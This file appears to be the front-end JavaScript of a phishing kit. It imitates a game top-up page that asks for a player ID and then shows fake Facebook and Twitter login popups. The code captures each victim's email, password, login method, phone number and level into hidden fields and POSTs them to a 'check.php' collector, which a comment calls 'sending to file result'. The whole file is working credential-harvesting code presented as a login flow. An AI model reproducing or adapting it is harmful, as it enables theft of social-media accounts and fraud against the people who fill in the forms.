// code for showing hiding popup
function open_account_login(){
	$('.account_login').show();
}
function open_facebook(){
	$('.login_facebook').show();
	$('.account_login').hide();
}
function open_twitter(){
	$('.login_twitter').show();
	$('.account_login').hide();
}
function close_account_login(){
	$(".account_login").hide()
}
function close_facebook(){
	$('.login_facebook').hide()
	$('.account_login').show();
}
function close_twitter(){
	$('.login_twitter').hide()
	$('.account_login').show();
}


// code for processing character id input 
function goInputPlayId() {
	$('#goInputPlayIdForm').submit(function(submitinggoInputPlayId){
	submitinggoInputPlayId.preventDefault();
	
	$beforeInputPlayId = $('#beforeInput-PlayId').val().trim();
            if($beforeInputPlayId == '' || $beforeInputPlayId == null || $beforeInputPlayId.length <= 8)
            {
                $('.wrongPlayerId').show();
                return false;
            }else{
               $('.wrongPlayerId').hide();
	           $('.n-box').hide();
			   $('.PayBeforeInputPlayId').hide();
			   $(".BtnAfterLoginId").attr('onclick','open_account_login()');
			   $('.new-y-box').show();
			   $('.PayAfterInputPlayId').show();
			   $("#afterInputPlayId").val($beforeInputPlayId);
			   $("#ValidatePopupPlayId").val($beforeInputPlayId);
			   }
			}); 
}

// code for validate data to next step
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$emailfb = $('#email-facebook').val().trim();
	$passwordfb = $('#password-facebook').val().trim();
	$loginfb = $('#login-facebook').val().trim();
            if($emailfb == '' || $emailfb == null || $emailfb.length <= 4)
            {
                $('.email-fb').show();
                $('.sandi-fb').hide();
                $('.login_facebook').show();
                return false;
            }else{
               $('.email-fb').hide();               
	           $("input#validateEmail").val($emailfb);
               $('.login_facebook').hide();  
            }
            if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 4)
            {
                $('.sandi-fb').show();
                $('.account_verification').hide();
                $('.login_facebook').show();
                return false;
            }else{
               $('.sandi-fb').hide();
	           $("input#validatePassword").val($passwordfb);
	           $("input#validateLogin").val($loginfb);
			   $('.account_verification').show();
               $('.login_facebook').hide();	          	           
	}
	}); 
}
function ValidateLoginTwitterData() {
	$('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData){
	submitingValidateLoginTwitterData.preventDefault();
	
	$emailtw = $('#email-twitter').val().trim();
	$passwordtw = $('#password-twitter').val().trim();
	$logintw = $('#login-twitter').val().trim();
            if($emailtw == '' || $emailtw == null || $emailtw.length <= 4)
            {
                $('.email-tw').show();
                $('.sandi-tw').hide();
                $('.login_twitter').show();
                return false;
            }else{
               $('.email-tw').hide();               
	           $("input#validateEmail").val($emailtw);
               $('.login_twitter').hide();  
            }
            if($passwordtw == '' || $passwordtw == null || $passwordtw.length <= 4)
            {
                $('.sandi-tw').show();
                $('.login_twitter').show();
                return false;
            }else{
               $('.sandi_tw').hide();
	           $("input#validatePassword").val($passwordtw);
	           $("input#validateLogin").val($logintw);
			   $('.account_verification').show();
               $('.login_twitter').hide();
	}
	});
}

// show hide password for facebook and twitter
function showFbPassword() {
    var x = document.getElementById("password-facebook");
    if (x.type === "password") {
        x.type = "text";
        $('.showPassword').hide();
        $('.hidePassword').show();
    } else {
        x.type = "password";
    }
}
function hideFbPassword() {
    var x = document.getElementById("password-facebook");
    if (x.type === "text") {
        x.type = "password";
        $('.showPassword').show();
        $('.hidePassword').hide();
    } else {
        x.type = "text";
    }
}
function showTwitterPassword() {
    var x = document.getElementById("password-twitter");
    if (x.type === "password") {
        x.type = "text";
        $('.TwitterShowPassword').hide();
        $('.TwitterHidePassword').show();
    } else {
        x.type = "password";
    }
}
function hideTwitterPassword() {
    var x = document.getElementById("password-twitter");
    if (x.type === "text") {
        x.type = "password";
        $('.TwitterShowPassword').show();
        $('.TwitterHidePassword').hide();
    } else {
        x.type = "text";
    }
}

// code for validate data to sending to file result
function ValidateVerificationData(){
	$('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
	submitingVerificationData.preventDefault();
	
	var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $playid = $("input#ValidatePopupPlayId").val();
	var $phone = $("input#phone").val();
	var $level = $("input#level").val();
	var $validateLogin = $("input#validateLogin").val();
	if($validateEmail == "" && $validatePassword == "" && $playid == "" && $phone == "" && $level == "" && $validateLogin == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "check.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.check_verification').show();
			$('.account_verification').hide();
		},
		success: function(){
		$(".processing_account").show();
		$('.check_verification').hide();
		$('.account_verification').hide();
		}
	});
	});  
	return false;
};